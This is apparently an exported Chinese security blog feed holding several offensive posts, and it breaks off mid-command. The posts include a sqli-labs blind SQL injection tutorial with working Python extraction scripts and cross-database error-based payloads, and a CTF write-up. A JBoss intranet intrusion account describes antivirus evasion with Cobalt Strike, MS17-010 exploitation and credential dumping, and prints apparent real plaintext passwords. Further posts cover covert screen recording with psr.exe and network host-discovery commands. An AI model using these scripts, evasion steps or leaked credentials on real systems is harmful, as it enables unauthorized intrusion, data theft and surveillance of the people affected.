    <content type="text"><![CDATA[起源是上交高校运维比赛（EIS_CTF）其中的一道盲注题，所以使用sqli-labs进行一个复习，权当是盲注的一个复习。 前言所有的测试均为无WAF的情况下进行。 注释关键字123-- # 单行注释，两个-连接符后面紧跟着一个空格# # 单行注释/**/ # 多行注释 实践效果：1234567891011121314151617mysql&gt; SELECT username,password FROM `users` WHERE id = &apos;2&apos;#&apos; LIMIT 0,1; -&gt; ;+----------+------------+| username | password |+----------+------------+| Angelina | I-kill-you |+----------+------------+1 row in setmysql&gt; SELECT username,password FROM `users` WHERE id = &apos;2&apos;-- &apos; LIMIT 0,1; -&gt; ;+----------+------------+| username | password |+----------+------------+| Angelina | I-kill-you |+----------+------------+1 row in set 都是可以正常得到查询的结果说明后面的SQL语句已经被我们注释掉了 Sql注入截取字符串常用函数在不回显的情况下，多数情况下都会用到截取字符串的问题，也就是在盲注的情况下，需要一个一个字符的去猜解，其中就需要截取字符串。 mid()函数语法为：1SELECT MID(column_name,start[,length]) FROM table_name; column_name 必需。要提取字符的字段。 start 必需。规定开始位置（起始值是 1）。 length可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。我们就直接使用sqli-labs的数据库进行演示。12345678database()为security mysql&gt; select mid(database(),1,4);+---------------------+| mid(database(),1,4) |+---------------------+| secu |+---------------------+1 row in set 其中column_name内容可为自行构造的sql语句。 substr()函数语法为：1SELECT SUBSTR(column_name,start[,length]) FROM table_name; 描述和用法与mid()函数是一样的1234567mysql&gt; select substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1);+--------------------------------------------------------------------------------------------------------+| substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1) |+--------------------------------------------------------------------------------------------------------+| e |+--------------------------------------------------------------------------------------------------------+1 row in set Left()函数语法为：1SELECT LEFT(ARG,LENGTH) FROM table_name; 取一个字符串的前若干位1234567mysql&gt; select left(database(),4);+--------------------+| left(database(),4) |+--------------------+| secu |+--------------------+1 row in set 布尔SQL盲注用sqli-labs的第6题作为例子 先手工fuzz一下。123http://192.168.2.100/sqli-labs/Less-6/?id=-1http://192.168.2.100/sqli-labs/Less-6/?id=1&apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot; &quot;报错，继续fuzz12http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;and&quot;1&quot;=&quot;1http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;and&quot;1&quot;=&quot;2 存在注入，但是没有回显，判断为可盲注。测试一下(其实盲注的脚本真的就只是这几行，难度无非是在waf过滤函数的替换绕过)。123456789101112131415161718# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;print(&quot;获取数据库长度&quot;)for i in range(1, 32): payload = &quot;and length(database())=%d--+&quot; % i res = requests.get(url + payload) if &quot;You are in...........&quot; in res.text: print(&quot;[+]数据库长度为:&quot; + str(i) + &quot;位&quot;) break结果为/usr/bin/python2.7 /home/rcoil/PycharmProjects/demo/demo.py获取数据库长度[+]数据库长度为:8位Process finished with exit code 0 所以证明注入确实存在且为盲注,浏览器验证下。 获取数据库名字先测试（fuzz）发现是可行的。然后写脚本进行猜解。12345678910111213141516# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;print(&quot;获取数据库名字&quot;)database = &apos;&apos;for i in range(1, 10): for j in range(97, 123): payload = &quot;and mid(database(),1,%d)=&apos;%s&apos;--+&quot; % (i, database + chr(j)) res = requests.get(url + payload) if &quot;You are in...........&quot; in res.text: database += chr(j) print(&quot;[-]当前猜解:&quot; +database) breakprint(&quot;[+]当前数据库:&quot; +database) 如果出现编码问题，要注意的是headers中Content-Type的值，必要的时候带入headers进行访问 获取表名1234567mysql&gt; select mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,2);+-----------------------------------------------------------------------------------------------------+| mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,2) |+-----------------------------------------------------------------------------------------------------+| em |+-----------------------------------------------------------------------------------------------------+1 row in set 所以接下来代码为123456789101112131415# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;table_names = &apos;&apos;for i in range(0, 8): for k in range(1, 32): for j in range(97, 123): payload = &quot;and mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit %d,1),1,%d)=&apos;%s&apos;--+&quot; % (i, k, table_names+chr(j)) request = requests.get(url + payload) if &quot;You are in&quot; in request.text: table_names += chr(j) print(&quot;第&quot; + str(i + 1) + &quot;张表的名字为&quot; + table_names) break 我发现，如果想要优雅一些，用ascii()或者改变k的位置比如1and ascii(mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit %d,1),%d,1))=&apos;%d&apos;--+&quot; % (i, k, j) 但是这样子的话，到最后，所有的table_names都拼接一起（后面补充）。 获取列名1234567mysql&gt; select mid((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 1,1),1,4);+------------------------------------------------------------------------------------------------------------------------------+| mid((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 1,1),1,4) |+------------------------------------------------------------------------------------------------------------------------------+| user |+------------------------------------------------------------------------------------------------------------------------------+1 row in set 代码和上面的没区别123456789101112131415# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;column_names = &apos;&apos;for i in range(0, 8): for k in range(1, 32): for j in range(97, 123): payload = &quot;and ascii(mid((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit %d,1),%d,1))=&apos;%d&apos;--+&quot; % (i, k, j) request = requests.get(url + payload) if &quot;You are in&quot; in request.text: column_names += chr(j) print(&quot;第&quot; + str(i + 1) + &quot;列字段名为&quot; + column_names) break 爆字段123456789101112131415# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;column_names = &apos;&apos;for i in range(0, 8): for k in range(1, 32): for j in range(21, 127): payload = &quot;and ascii(mid((select username from security.users limit %d,1),%d,1))=&apos;%d&apos;--+&quot; % (i, k, j) request = requests.get(url + payload) if &quot;You are in&quot; in request.text: column_names += chr(j) print(&quot;第&quot; + str(i + 1) + &quot;行数据为&quot; + column_names) break 这个布尔SQL盲注暂时分析到这里。如果想要一脚本搞定以上所有的内容，那就def一下就很方便调用了。写到这里的时候，我发现，所有的脚本都有很多的相同点，只需要更换变量就可以直接使用。而且，在去翻资料的过程中，我发现在bool盲注中二分法比穷举要快一些，所以我参照王一航的思路进行改写。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python# encoding:utf8import requestsimport sysurl = &quot;http://192.168.2.100/sqli-labs/Less-6/?id=&quot;# 定义payloaddef exce(database_name, table_name, column_name, Result, Char, mid): global url esndStr = &quot; and\&quot;1\&quot;=\&quot;1&quot; payload = &quot;1\&quot;and(ascii(mid((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot; limit &quot; + Result + &quot;,1),&quot; + Char + &quot;,1))&gt;&quot; + mid + &quot;)&quot; tempurl = url + payload + esndStr request = requests.get(tempurl).text if &quot;You are in...........&quot; in request: return True else: return False# 二分查询def doubleSearch(database_name, table_name, column_name, Result, Char, left_number, right_number): while left_number &lt; right_number: mid = int((left_number + right_number) / 2) if exce(database_name, table_name, column_name, str(Result),str(Char + 1),str(mid)): left_number = mid else: right_number = mid if right_number-left_number == 1: if exce(database_name, table_name, column_name, str(Result),str(Char + 1),str(mid)): mid += 1 break else: break return chr(mid)# 定义所有变量初始def getAllData(database_name, table_name, column_name): for i in range(32): counter = 0 for j in range(32): counter += 1 temp = doubleSearch(database_name, table_name, column_name, i, j, 0, 127) # 从255开始查询 if ord(temp) == 1: break sys.stdout.write(temp) sys.stdout.flush() if counter == 1: break sys.stdout.write(&quot;\r\n&quot;) sys.stdout.flush()def getAllSchemaNames(): return getAllData(column_name=&quot;schema_name&quot;, table_name=&quot;schemata&quot;, database_name=&quot;information_schema&quot;)getAllSchemaNames() 大致思想：1、mid为left和right的中间值，mid是否和left相等（right-left=1），相等跳到5，如果不等跳到22、请求mid，如果返回正确的页面跳到3，如果返回错误的页面跳到43、返回页面正确，将left赋值为mid4、返回页面错误，将right赋值为mid5、返回mid值 二分法它的原理是把可能出现的字符看做一个有序的序列，这样在查找所要查找的元素时,首先与序列中间的元素进行比较,如果大于这个元素,就在当前序列的后半部分继续查找,如果小于这个元素,就在当前序列的前半部分继续查找,直到找到相同的元素,或者所查找的序列范围为空为止。 如果需要查找数据表和数据表的内容，在getAllSchemaNames()添加个where语句 时间的SQL盲注延时注入是主要针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术。 延迟注入主要点是在于if()函数的判断、1if(condition,true,false) //条件语句 condition 是判断条件 true 和false 是符合condition自定义的返回结果。 本地测试感受一下1234567891011121314151617181920212223mysql&gt; select ascii(mid(database(),1,1));+----------------------------+| ascii(mid(database(),1,1)) |+----------------------------+| 115 |+----------------------------+1 row in set (0.00 sec)mysql&gt; select if(ascii(mid(database(),1,1))=115,sleep(5),1);+-----------------------------------------------+| if(ascii(mid(database(),1,1))=115,sleep(5),1) |+-----------------------------------------------+| 0 |+-----------------------------------------------+1 row in set (5.01 sec) mysql&gt; select if(ascii(mid(database(),1,1))=114,sleep(5),1);+-----------------------------------------------+| if(ascii(mid(database(),1,1))=114,sleep(5),1) |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.00 sec) 如果condition判断为正确，则产生延迟，否则不产生延迟。至于脚本，修改下上面的脚本进行判断即可。123456789101112url = &quot;http://192.168.2.100/sqli-labs/Less-9/?id=&quot;esndStr = &quot; and sleep(3))--+&quot;payload = &quot;1&apos; and ((ascii(mid((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot; limit &quot; + Result + &quot;,1),&quot; + Char + &quot;,1))&gt;&quot; + mid + &quot;)&quot;tempurl = url + payload + esndStrbefore_time = time.time()requests.head(tempurl)after_time = time.time()use_time = after_time - before_timeif abs(use_time) &lt; 0.1: return Trueelse: return False 报错的SQL盲注如果页面上显示数据的报错信息，那么可以直接使用报错的方式把想要的信息爆出来。 比如在mysql中我们可以使用如下的经典语句进行报错。1select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x; 这是网上流传很广的一个版本，可以简化成如下的形式。1select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) 如果关键的表被禁用了，可以使用这种形式1select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) 如果rand被禁用了可以使用用户变量来报错1select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2) 其实这是mysql的一个bug所引起的，其他数据库都不会因为这个问题而报错。 另外，在mysql5.1版本新加入两个xml函数，也可以用来报错。1234mysql&gt; select * from article where id = 1 and extractvalue(1, concat(0x5c,(select pass from admin limit 1)));ERROR 1105 (HY000): XPATH syntax error: &apos;\admin888&apos; mysql&gt; select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,(select pass from admin limit 1),0x5e24),1)); ERROR 1105 (HY000): XPATH syntax error: &apos;^$admin888^$&apos; 而在其他数据库中也可以使用不同的方法构成报错12345PostgreSQL: /?param=1 and(1)=cast(version() as numeric)-- MSSQL: /?param=1 and(1)=convert(int,@@version)-- Sybase: /?param=1 and(1)=convert(int,@@version)-- Oracle &gt;=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)-- 参考：详解SQL盲注测试高级技巧MYSQL注入天书之盲注讲解]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[平衡信息杯-Write-Up]]></title>
    <url>%2F2017%2F10%2F%E5%B9%B3%E8%A1%A1%E4%BF%A1%E6%81%AF%E6%9D%AF-Write-Up%2F</url>
    <content type="text"><![CDATA[南宁市第二届网络与信息安全技术大赛 BasicBasic_100-神秘二进制这二进制莫名其妙，因为没人能做出，所以就改题了。 Basic_100_2-Finally, You get flag!附件是一个base64的加密,只要解密就可以看到flag Basic_200这道题怎么说呢，看图就知道了。 WebWeb_100附件的代码为：123&lt;script&gt;eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&apos;&apos;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&apos;\\w+&apos;&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\b&apos;+e(c)+&apos;\\b&apos;,&apos;g&apos;),k[c]);return p;&#125;(&apos;2 c=E;g m()&#123;2 8=p.q;2 6=l j();f(8.w(&quot;?&quot;)!=-1)&#123;2 h=8.r(1);5=h.9(&quot;&amp;&quot;);d(2 i=0;i&lt;5.o;i++)&#123;6[5[i].9(&quot;=&quot;)[0]]=u(5[i].9(&quot;=&quot;)[1])&#125;&#125;v 6&#125;g n(4,s,e)&#123;7=&quot;&quot;;d(i=0;i&lt;4.o;i++)&#123;k=(s+e)%c;t=e;e=s+e;s=t;7+=4[i]^k&#125;f(7==&quot;x&quot;)b.a(&quot;C\&apos;s z!&quot;);B b.a(&quot;A\&apos;s y!&quot;)&#125;2 3=l j();3=m();b.a(3);n(3[\&apos;4\&apos;],F,D);&apos;,42,42,&apos;||var|Request|key|strs|theRequest|cipher|url|split|log|console|iv|for||if|function|str||Object||new|GetRequest|enc|length|location|search|substr|||unescape|return|indexOf|34558914423312210022264341011282361161032135513678115123012499|Wrong|Right|Something|else|That|21|0xff|13&apos;.split(&apos;|&apos;),0,&#123;&#125;))&lt;/script&gt; 用http://jsbeautifier.org/进行解密之后为：1234567891011121314151617181920212223242526272829var iv = 0xff;function GetRequest() &#123; var url = location.search; var theRequest = new Object(); if (url.indexOf(&quot;?&quot;) != -1) &#123; var str = url.substr(1); strs = str.split(&quot;&amp;&quot;); for (var i = 0; i &lt; strs.length; i++) &#123; theRequest[strs[i].split(&quot;=&quot;)[0]] = unescape(strs[i].split(&quot;=&quot;)[1]) &#125; &#125; return theRequest&#125;function enc(key, s, e) &#123; cipher = &quot;&quot;; for (i = 0; i &lt; key.length; i++) &#123; k = (s + e) % iv; t = e; e = s + e; s = t; cipher += key[i] ^ k &#125; if (cipher == &quot;34558914423312210022264341011282361161032135513678115123012499&quot;) console.log(&quot;That&apos;s Right!&quot;); else console.log(&quot;Something&apos;s Wrong!&quot;)&#125;var Request = new Object();Request = GetRequest();console.log(Request);enc(Request[&apos;key&apos;], 13, 21); 反推12345678910function enc(key, s, e) &#123; cipher = &quot;&quot;; for (i = 0; i &lt; key.length; i++) &#123; k = (s + e) % iv; t = e; e = s + e; s = t; cipher += key[i] ^ k &#125; if (cipher == &quot;34558914423312210022264341011282361161032135513678115123012499&quot;) console.log(&quot;That&apos;s Right!&quot;); 得出key为000000003007006000702000结合function GetRequest得出payload为1?key=000000003007006000702000 但是提交结果不对。过了大半天，但是一个人都没解出来，官方给出hintemmmmm，这题就这样吧，看不懂。果然100分。 Web_200转啊转，转啊转，信息收集。 这个input、这个URL格式，不正是今年NodeJS RCE 参考了这个利用 Node.js 反序列化漏洞远程执行代码但是没成功，弹不了shell的，群里说，直接读直接读。但是我没能直接读出来，得把结果扔到vps上。payload出自于如何使用NodeJS写出一枚远程命令执行(RCE）漏洞 Web_300直接sqlmap就行了。1234567891011121314sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=8 AND 4897=4897 Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=8 AND SLEEP(5)---[13:39:29] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL &gt;= 5.0.12 MiscMisc_200_2这题一直在踩内部doc的坑。 Misc_300先用脚本提取Pcapng中的菜刀流量，这题最大的坑就是数据包有点大大大大大大了。看到了ProcDump很关键，这道题可能就是利用了ProcDump+mimikatz的组合，毕竟毕竟这样免杀。先导出http，找到了关键点（其实dump的结果都不小），辣鸡数据包、辣鸡电脑，卡到生活不能自理。规则为frame.len == 533,追踪流确实看到关键字将数据抠出来，使用mimikatz进行恢复，但是恢复过程中还是出现不少问题，抠出来的数据恢复不了，mimikatz没注意是32还是64等等。。。123mimikatz.exesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full MobileAndroid_crackme1先用jadx反编译apk就一个控件。往下看，了解这个程序的主要思想：输入的Password值，经过CryptClass后，得到的加密结果是否匹配cip，正确就输出Bingo。重点查看123String enc = CryptClass.encrypt_str(passstr, (String) keys.get(passstr.length() % keys.size()));if (enc.equals(MainActivity.this.cip)) &#123; Toast.makeText(MainActivity.this, &quot;Bingo!&quot;, 1).show(); 首先还是得去弄明白它们的值是怎么来的。 看到R.string.key6，然后去找这个key6，但是找到的是1public static final int key6 = 2131165222; 有安卓开发的人都知道，编写java代码中的常量在一般情况下，我们是定义在string.xml这个文件中，这个string.xml的值会被R文件映射。123this.Password = (EditText) findViewById(R.id.editText5);this.Cipher = (EditText) findViewById(R.id.editText6);this.cip = getString(R.string.key6); Password值是编辑框接受输入的值，为后续的passstrCipher值不知道干啥cip值为05bfed10af08193ff0b218e887c53dfa162f8a6e8bpassstr.length() % keys.size()的理论值为0,1,2,3,4,5，主要看passstr的长度，因为是passstr的长度决定了调用哪一个keys验证得出passstr的长度以及keys值这样我们就可以得出passstr的长度为21，使用的keys为3，也就是NO1bgoMn14J85yrLQHM9KoZJ 接下来，就看看怎么解密了。看了下，我选择了爆破的方式。在验证passstr的长度以及keys值的时候，发现输入的password值个数是21个，加密后个数变为42，也就是说1个字符加密得出2个字符。那我们就将cip拆开进行每位数的验证顺便说一句，上图不应该是解密，应为加密，还有就是Eclipse的调试不够人性化。拆开验证是： 看了各位大佬的wp，才发现，CryptClass类里面是有解密函数的。 ReVwindows_crackme2菜鸡总是看哪些题是多人解出来之后就去做哪题。扔进ILSpy没看到源码，扔进Reflector拿到源码。Form1的内容为机器码12345public Form1()&#123; this.InitializeComponent(); this.textBox1.Text = &quot;SzLPCCA4&quot;;&#125; 我们要找出相应的注册码，先看源码。12345678910111213141516171819202122232425262728293031323334353637private void button1_Click(object sender, EventArgs e)&#123; string text = this.textBox2.Text; //注册码框 SHA1 sha = new SHA1CryptoServiceProvider(); //Sha1编码 byte[] bytes = Encoding.Unicode.GetBytes(this.textBox1.Text); string str2 = BitConverter.ToString(sha.ComputeHash(bytes)); //对SzLPCCA4进行Sha1编码 string str3 = new string(text.ToCharArray().Reverse&lt;char&gt;().ToArray&lt;char&gt;()); //对输入的注册码进行反转 string str4 = &quot;&quot;; int num = 0; for (int i = 0; i &lt; str3.Length; i++) &#123; if (text[i] != &apos;-&apos;) &#123; num++; str4 = str4 + str3[i].ToString(); if (num == 2) &#123; num = 0; if (i != (str3.Length - 1)) &#123; str4 = str4 + &quot;-&quot;; &#125; &#125; &#125; &#125; string str5 = AESEncrypt(str2, &quot;H8vY7QKY&quot;, &quot;8@Z&gt;FXsv&quot;); //对sha1编码后的SzLPCCA4进行AES加密 string str6 = AESEncrypt(str4, &quot;H8vY7QKY&quot;, &quot;8@Z&gt;FXsv&quot;); //对反转后的注册码进行AES加密 if (str5 == str6) &#123; MessageBox.Show(&quot;再来一瓶!&quot;); &#125; else &#123; MessageBox.Show(&quot;谢谢参与!&quot;); &#125;&#125; 主体的思想为： 机器码：Sha1编码后再进行AES加密的值为str5注册码：反转后再进行AES加密的值为str6如果str5等于str6则返回再来一瓶，flag则为输入的注册码 解题思路： AES加密的密钥都是一样的，所以加密前是相等的。只要将机器码进行Sha1编码后再反转就是注册码也就是将str2进行输出后反转或者反转后输出 demo为：1234567public static void Main(string() args)&#123; SHA1 sha = new SHA1CryptoServiceProvider(); byte[] bytes = Encoding.Unicode.GetBytes(&quot;SzLPCCA4&quot;); string str2 = BitConverter.ToString(sha.ComputeHash(bytes)); MessageBox.Show(str2);&#125; 得到的结果为0AC8B571539392065B0B160148832CA2DC2710A1,进行反转且八位每段得出flag。1A0172CD-2AC23884-1061B0B5-60293935-175B8CA0 最后附张图：]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jboss引起的内网渗透]]></title>
    <url>%2F2017%2F10%2FJboss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[待人如知己切入点为Jboss反序列化，就不多说了，远程部署war。war中包含了1shell、reGeorg、https.exe 使用https.exe反弹一个msf的shell，不多说，上远控巩固权限。 P·S：图片是后面补上的 信息收集查看进程信息是否有杀软看了一轮没有什么主流的杀软MsMpEng.exe是属于Windows Defender 自动保护服务的核心进程。 12345systeminfoipconfig /allnet viewpingnet time /domain 综合以上信息ipconfig /all的信息，DNS suffix search list是xxx.com,nds服务器是xx.18,备份nds服务器为xx.19。net time /domain 指向的是xx.17的机器，ping xxx.com指向xx.18(第二天ping xxx.com结果为xx.17)，到第三天再看，又发现是xx.18的。得到的结果： 192.168.1.17 为域控192.168.1.18和192.168.1.19为DNS服务器，不确定是否为域控 不确定的话就下一步确认、12net group &quot;domain admins&quot; /domain #查看域管理员net group &quot;domain controllers&quot; /domain #查看域控制器 结果为：那就可以明确xx.17，xx.18，xx.19为域控制器 小小免杀因为是存在着MsMpEng.exe，所以如果不做一些免杀的话，是会被杀掉的。使用Cobalt Strike生成一个exe和bin文件，将两者进行混淆，最后生成一个新的exe 横向渗透由于是Jboss反序列化为入口(正常不存在提权情况)，在控制台处可以看到类似日志的IP记录，发现了内网还有个172.18.19.10的IP，所以判断还有这么一个段的存在。进到机器上面却没有看到有链接 = = 组策略漏洞（GPP）12net use e: \\192.168.1.17\\sysvol（三台）dir /s groups.xml 找不到groups.xml，这条路不通。 MS17-010先着手用MS17-010打一轮，打一轮再说。留着后面没思路的时候抓密码用。12345678910MS17-010 FCE-3212：192.168.1.92 Windows 7 Professional 7601 SP 1 FCE-3235：192.168.1.126 Windows 7 Professional 7601 SP 1 FCE-PLOT：192.168.1.217 Windows xp [!] Target could be either SP2 or SP3 *** *** *** MS14-068 KERBEROS漏洞之前也没怎么用过这个漏洞。要测试这个漏洞，前提还是要明白kerberos的整个认证协议过程，不然是不会明白原理的，测试过程中出了什么问题也不知道怎么解决。利用这个漏洞，我们需要一个普通域用户的账户名和密码或者是哈希，哈希传递我已经在别的文章中总结了，其实哈希和密码是有相同的效果。以及域名称，该用户的sids。 而我们在信息收集的时候，已经将靶机上的域用户账号密码抓取,但是我们不知道域控上面是否存在这个漏洞。经过一轮测试，发现MS14-068失败。 抓密码靶机上抓不到域管，那就去别的机器去抓。先将有MS17-010的抓一轮，幸运的话，就直接可以了。12345678FCE-3212：192.168.1.92 Windows 7 Professional 7601 SP 1 * Username : jduffy * Password : papap111FCE-UTIL：192.168.1.230 Windows 7 Professional 7601 SP 1 * Username : ComputerRoom * Password : papap duang的一样，很幸运，在第二台的时候就发现有域管了。附张图 我在dumn密码的时候发现一个很奇怪的问题，我打的是192.168.1.244，但是返回来的结果是192.168.1.37的结果，所以我去看了ipconfig /all我就懵了，这不知道是啥情况。 如果MS17-010行不通的话就开始找漏洞配置不当以获取更多主机权限，然后再继续抓密码。这些在之前的文章是总结过的。 擦干屁股开溜了，至于内网的广度和深度就不做研究了。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巧妙利用win自带的 PSR 实现监控Windows桌面]]></title>
    <url>%2F2017%2F09%2F%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8win%E8%87%AA%E5%B8%A6%E7%9A%84-PSR-%E5%AE%9E%E7%8E%B0%E7%9B%91%E6%8E%A7Windows%E6%A1%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[PSR 即win自带的”问题步骤记录器”,也就是说它会捕捉活动窗口。这还是在课上无聊翻到的一个东西，用在屏幕截图上也是有很好的效果，因为是Windows系统自带的，所以不用考虑免杀问题。 唯一的限制：要求系统是windows 7之后，也就是在做个人机的时候可以使用，不排除个别的情况。之前不知道有命令行的方法，直到看了三好学生的paper（这段时间一直在啃）。 进阶直接查看进阶只用方法。123456789101112131415161718psr.exe [/start |/stop][/output &lt;fullfilepath&gt;] [/sc (0|1)] [/maxsc &lt;value&gt;][/sketch (0|1)] [/slides (0|1)] [/gui (0|1)][/arcetl (0|1)] [/arcxml (0|1)] [/arcmht (0|1)][/stopevent &lt;eventname&gt;] [/maxlogsize &lt;value&gt;] [/recordpid &lt;pid&gt;]/start 开始录制，需要指定文件保存路径/stop 停止录制 /sc 捕捉记录步骤的截图，0|1/maxsc 最大的截图数量/maxlogsize 最大日志文件大小(MB)/gui 是否显示psr的界面，0|1 /arcetl Include raw ETW file in archive output./arcxml Include MHT file in archive output./recordpid Record all actions associated with given PID./sketch Sketch UI if no screenshot was saved./slides Create slide show HTML pages./output 保存的输出路径/stopevent Event to signal after output files are generated. 示例：123456psr.exe /start /gui 0 /output C:\windows\temp\capture.zip 后台启动psr并开始录制，文件保存为C:\windows\temp\capture.zipStart-Sleep -s 10; 等待10s，即录制时间为10spsr.exe /stop; 结束录制，自动退出 压缩包内是mht格式,直接用IE打开就好。效果为： 防御 小结利用PSR监控Windows桌面，不仅仅能够捕获用户桌面的操作，而且在报告中会包含更多有用的细节信息，相信你在渗透测试的过程中，bat+定时任务，一定会用上它。 【参考】渗透技巧——如何巧妙利用PSR监控Windows桌面]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>渗透技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网存活扫描]]></title>
    <url>%2F2017%2F08%2F%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[咦！使人觉得遥远的不是时间长，而是两三件不可挽回的事。 icmp扫描基于icmp的各种内网主机发现方式，如果防火墙过滤的icmp请求，这种方式基本就废了，但是基本上都不会过滤icmp协议的请求。除了本身自带的命令，也可以考虑使用第三方程序，比如cping。 在win下使用icmp扫描 cmd中执行如下命令，对整个C段进行ping扫描 1for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i &quot;ttl&quot; 利用powershell对目标内网进行icmp扫描 123powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000&quot; 目标网段，并非仅限C段，比如你也可以写成这种方式`192.168.3.1 - 192.168.31.254` 在linux下使用各类icmp扫描 最简单的方式,将下面的代码保存至shell中,赋予其执行权限,执行该脚本即可 1234567891011#!/bin/bashfor ip in 192.168.1.&#123;1..254&#125; do ping $ip -c 1 &amp;&gt; /dev/null if [ $? -eq 0 ];then echo $ip is alive .... fi done或者for i in 192.168.4.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i is alived; fi; done nmap的icmp扫描 1nmap -sn -PE 192.168.1.0/24 arp扫描在win下使用各种arp扫描123start /b arpscan.exe -t 192.168.1.0/24 &gt;&gt; result.txtpowershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot; &gt;&gt; result.txt 在 linux 下使用 arp 扫描1234567891011# wget https://nmap.org/dist/nmap-7.40.tar.bz2# bzip2 -cd nmap-7.40.tar.bz2 | tar xvf -# cd nmap-7.40 # ./configure 这里可以用--prefix指定安装路径# echo $?# make# make install# echo $?# make install# echo $? # nmap -sn -PR 192.168.1.0/24 尝试arp扫描 处在别人的vpn内网(kali) 123456789101112netdiscover -r 192.168.1.0/24 -i eth0msf的arp扫描模块msf &gt; use auxiliary/scanner/discovery/arp_sweepmsf &gt; show optionsmsf &gt; set interface eth0msf &gt; set smac 00:0c:29:92:fd:85msf &gt; set rhosts 192.168.1.0/24msf &gt; set threads 20msf &gt; set shost 192.168.1.27msf &gt; run meterpreter 123meterpreter &gt; getsystem 另外,在目标机器上扫描时,务必先提权(个人建议,会方便很多),不然扫描过程中可能会有些问题meterpreter &gt; run autoroute -s 192.168.1.0/24meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 基于smb和netbios的内网主机发现方式win下:1nbtscan.exe -m 192.168.1.0/24 非常经典的小工具 linux下:123456wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgztar -zxvf nbtscan-source-1.0.35.tgzmakeecho $?./nbtscan -h./nbtscan -m 192.168.1.0/24 域内扫描12net viewdsquery computer 其实,域内最好用的也就是nbtscan了 Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip1234567@echo offsetlocal ENABLEDELAYEDEXPANSION@FOR 